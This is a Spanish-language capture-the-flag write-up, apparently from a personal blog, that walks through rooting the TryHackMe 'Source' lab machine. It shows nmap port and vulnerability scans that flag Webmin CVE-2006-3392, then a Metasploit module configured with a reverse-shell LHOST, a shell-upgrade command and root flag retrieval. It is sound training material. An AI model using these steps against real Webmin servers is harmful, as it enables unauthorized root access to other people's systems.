---
layout: post
title: Tryhackme Soerce
date: 2022-09-04
modified: 2022-09-04
description: resolución de la maquina source de la plataforma tryhackme.
tag:
 - thyhackme
 - ctf
---

Iniciamos con un escaneo de nmap. 

	nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn "ip"  -oG ports

El cual nos regresa que hay dos puertos abiertos, el 22 y el 10000.

	# Nmap 7.92 scan initiated Sun Sep  4 15:30:41 2022 as: nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG ports 10.10.144.128
	 Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
	Host: 10.10.144.128 ()  Status: Up
	Host: 10.10.144.128 ()  Ports: 22/open/tcp//ssh///, 10000/open/tcp//snet-sensor-mgmt///
	 Nmap done at Sun Sep  4 15:30:59 2022 -- 1 IP address (1 host up) scanned in 17.67 seconds

El puerto 22 como nmap nos indica pertenece a ssh, pero lo dejaremos de lado y nos concentraremos solo en puerto 10000. Si abrimos el navegador vamos y ponemos la ip con el puerto nos mostrara una pantalla de login.

![imagen 1](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-source/zero-2022-09-04-15-34-49.png)

Ahora sabemos que es un login de webmin. Con ayuda de nmap iniciaremos de nuevo un scaneo, pero esta vez en busca de posibles vulnerabilidades.

	nmap -p22,10000 --script "vuln" -oN vuln 10.10.144.128

Lo cual nos arrojara lo siguiente:

	Nmap 7.92 scan initiated Sun Sep  4 15:31:43 2022 as: nmap -p22,10000 --script vuln -oN vuln 10.10.144.128
	Nmap scan report for 10.10.144.128
	Host is up (0.22s latency).

	PORT      STATE SERVICE
	22/tcp    open  ssh
	10000/tcp open  snet-sensor-mgmt
	| http-vuln-cve2006-3392:
	|   VULNERABLE:
	|   Webmin File Disclosure
	|     State: VULNERABLE (Exploitable)
	|     IDs:  CVE:CVE-2006-3392
	|       Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.
	|       This allows arbitrary files to be read, without requiring authentication, using "..%01" sequences
	|       to bypass the removal of "../" directory traversal sequences.
	|
	|     Disclosure date: 2006-06-29
	|     References:
	|       http://www.exploit-db.com/exploits/1997/
	|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3392
	|_      http://www.rapid7.com/db/modules/auxiliary/admin/webmin/file_disclosure

	 Nmap done at Sun Sep  4 15:32:16 2022 -- 1 IP address (1 host up) scanned in 32.51 seconds

Nmap nos retorna que el servicio webmin es vulnerable. Mas en especifico la versión 1.290. Al ser una versión vieja existen muchos exploits actualmente, por lo que solo hay que buscar en metasploit.

![imagen 2](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-source/zero-2022-09-04-15-36-21.png)

En este caso vamos a usar el numero 6, para seleccionarlo hacemos un `use 6`En este caso solo hay que rellenar algunos parámetros.

![imagen 3](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-source/zero-2022-09-04-15-36-59.png)

Parámetros necesarios: 
- RHOSTS: "IP"
- RPORT: 10000
- SSL: true
- LHOST: "La ip de nuestro vpn"
- LPORT:"Lo podemos dejar por defecto si queremos"

Ahora al rellenar todo solo ejecutamos con un `run` y listo.


![imagen 4](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-source/zero-2022-09-04-15-39-27.png)

Al principio pude ser que no veamos nada, pero si hacemos un "ls" por ejemplo, nos regresa lo que hay en la carpeta, Pero aunque ya tengamos acceso nos daremos cuenta que no podemos movernos de esa carpeta.

Para arreglar eso tendremos que arreglar un poco la shell, aunque es baste fácil.

	script /dev/null -c bash

Con esto ya podremos moverlos libremente. Y listo, si hacemos `whoami` veremos que estamos como root, ahora solo queda leer las flag que están en /root y /home/dark.

![imagen 5](https://raw.githubusercontent.com/skayblye/skayblye.github.io/master/_posts/tryhackme-source/zero-2022-09-04-15-40-11.png)

